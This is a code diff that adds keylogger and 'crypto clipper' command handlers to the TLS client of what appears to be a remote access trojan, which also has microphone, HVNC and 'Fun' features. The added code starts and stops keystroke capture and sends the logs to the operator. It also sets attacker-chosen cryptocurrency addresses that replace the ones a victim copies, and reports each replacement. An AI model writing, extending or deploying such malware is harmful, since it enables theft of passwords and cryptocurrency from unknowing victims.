@@ -350,6 +350,64 @@ internal class TlsClient : IDisposable
                     MicrophoneFeature.Stop();
                     break;
 
+                // ── Keylogger ────────────────────────────────────────
+                case PacketType.KeyloggerStart:
+                    KeyloggerFeature.Start();
+                    break;
+
+                case PacketType.KeyloggerStop:
+                    KeyloggerFeature.Stop();
+                    break;
+
+                case PacketType.KeyloggerGetLogs:
+                    var kLogs = KeyloggerFeature.GetAndClearLogs();
+                    _ = WritePacketAsync(new Packet
+                    {
+                        Type = PacketType.KeyloggerLogsResult,
+                        Data = JsonSerializer.Serialize(
+                            new KeyloggerLogsResultStub { Logs = kLogs, IsRunning = KeyloggerFeature.IsRunning },
+                            SeroJson.Default.KeyloggerLogsResultStub)
+                    }, ct);
+                    break;
+
+                case PacketType.KeyloggerClear:
+                    KeyloggerFeature.GetAndClearLogs();
+                    break;
+
+                // ── Crypto Clipper ────────────────────────────────────
+                case PacketType.ClipperSetConfig:
+                    var clipCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ClipperSetConfigStub);
+                    if (clipCfg != null)
+                    {
+                        CryptoClipperFeature.OnDetected = async (type, orig, rep) =>
+                            await WritePacketAsync(new Packet
+                            {
+                                Type = PacketType.ClipperDetected,
+                                Data = JsonSerializer.Serialize(
+                                    new ClipperDetectedStub { Type = type, Original = orig, Replaced = rep },
+                                    SeroJson.Default.ClipperDetectedStub)
+                            }, CancellationToken.None);
+                        CryptoClipperFeature.SetConfig(clipCfg.Enabled, clipCfg.Addresses);
+                    }
+                    break;
+
+                case PacketType.ClipperGetStats:
+                    var (lt, lo, ln) = CryptoClipperFeature.LastHit;
+                    _ = WritePacketAsync(new Packet
+                    {
+                        Type = PacketType.ClipperStatsResult,
+                        Data = JsonSerializer.Serialize(
+                            new ClipperStatsResultStub
+                            {
+                                Enabled  = CryptoClipperFeature.IsEnabled,
+                                Count    = CryptoClipperFeature.ReplaceCount,
+                                LastType = lt,
+                                LastOrig = lo,
+                                LastNew  = ln
+                            }, SeroJson.Default.ClipperStatsResultStub)
+                    }, ct);
+                    break;
+
                 // ── Fun ──────────────────────────────────────────────
                 case PacketType.FunCmd:
                     var funCmd = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FunCmdDataStub);
@@ -1357,4 +1415,11 @@ internal class HvncClipboardDataStub
 // Fun
 [JsonSerializable(typeof(FunCmdDataStub))]
 [JsonSerializable(typeof(FunResultStub))]
+// Keylogger
+[JsonSerializable(typeof(KeyloggerLogsResultStub))]
+// Crypto Clipper
+[JsonSerializable(typeof(ClipperSetConfigStub))]
+[JsonSerializable(typeof(ClipperConfig))]
+[JsonSerializable(typeof(ClipperDetectedStub))]
+[JsonSerializable(typeof(ClipperStatsResultStub))]
 internal partial class SeroJson : JsonSerializerContext { }
